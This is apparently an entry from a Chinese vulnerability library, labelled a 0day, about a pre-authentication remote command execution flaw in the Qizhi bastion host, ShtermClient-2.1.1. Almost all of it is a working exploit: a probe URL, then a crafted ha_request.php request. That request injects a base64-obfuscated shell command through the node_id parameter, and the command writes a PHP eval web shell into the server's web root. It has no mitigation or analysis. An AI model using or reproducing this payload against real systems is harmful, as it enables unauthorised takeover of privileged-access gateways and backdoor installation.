---
title: '齐治堡垒机前台远程命令执行漏洞-0day'
date: Sat, 12 Sep 2020 15:55:14 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

ShtermClient-2.1.1

### 漏洞利用

1.访问 http://10.20.10.11/listener/cluster\_manage.php 返回OK 2.访问如下链接生成一句话木马

```
https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUW3NoZWxsXSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9zaGVsbC5waHA="|base64${IFS}-d|bash`|${IFS}|echo${IFS} 
```